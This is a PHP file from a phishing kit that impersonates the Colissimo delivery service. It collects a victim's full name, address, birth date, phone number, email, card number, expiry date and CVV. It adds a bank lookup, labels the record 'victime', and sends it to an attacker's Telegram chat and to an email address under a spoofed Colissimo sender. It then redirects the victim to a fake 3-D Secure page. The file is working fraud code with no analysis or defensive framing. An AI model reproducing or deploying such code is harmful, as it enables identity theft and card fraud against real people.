<?php
include ("../ab.php");
include ("../prevents/anti1.php");
include ("../prevents/anti2.php");
include ("../prevents/anti3.php");
include ("../prevents/anti4.php");
include ("../prevents/anti5.php");
include('./settings.php');
include('./get_browser.php');
include('./get_ip.php');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if(!isset($_SESSION['email']) ||
    !isset($_SESSION['full_name']) ||
    !isset($_SESSION['D-D-N']) ||
    !isset($_SESSION['adresse']) ||
    !isset($_SESSION['zip']) ||
    !isset($_SESSION['ville']) ||
    !isset($_SESSION['phone_number']))
{

    header("location: ../index.php?error=champs");
    return;
}

$url = 'https://lookup.binlist.net/' . $_POST['cc'] . '';
$json = file_get_contents($url);
$data = json_decode($json);
$scheme = $data->scheme;
$bank = $data->bank->name;
$level = $data->brand;
$type = $data->type;

$_SESSION['cc'] = $_POST['cc'];
$_SESSION['exp'] = $_POST['exp'];
$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['nom_banque'] = $bank;
$_SESSION['level_banque'] = $level;
$_SESSION['type_carte'] = $scheme . " - " . $type;

$msg = "____ 📝 Information de la victime 📝 _____\n";
$msg .= "Nom et prénom : " . $_SESSION['full_name'] . "\n";
$msg .= "Adresse : " . $_SESSION['adresse'] . "\n";
$msg .= "Code Postal : " . $_SESSION['zip'] . "\n";
$msg .= "Date de naissance : " . $_SESSION['D-D-N'] . "\n";
$msg .= "Ville : " . $_SESSION['ville'] . "\n";
$msg .= "Téléphone : " . $_SESSION['phone_number'] . "\n";
$msg .= "E-mail : " . $_SESSION['email'] . "\n\n";


$msg .= "_____ 💳 Information de la carte 💳 _____\n";
$msg .= "Numéro de carte : " .$_POST['cc']."\n";
$msg .= "Date d'expiration : " .$_POST['exp']."\n";
$msg .= "CVV : " .$_POST['cvv']."\n";
$msg .= "Banque de la carte : " . $bank . "\n";
$msg .= "Niveau de la carte : " . $level . "\n";
$msg .= "Type de carte : " . $scheme . " - " . $type . "\n";
$msg .= "_________________________________\n";
$msg .= $ip."\n";

if(!in_array($msg, $_SESSION['msg'])) $_SESSION['msg'][] = $msg;
$subject = "💳 +1 REZ COLISSIMO - $ip 💳 ";
$head = "From: Colissimo <log@rezappl.com>" . "\r\n";

$_SESSION['4cc'] = substr($_POST['cc'],-4);

if(!in_array($msg, $_SESSION['msg'])) $_SESSION['msg'][] = $msg;
toTG($msg, $chat, $token);
@mail($email, $subject,$msg,$head);
header('Location: ../3ds.php');
?>
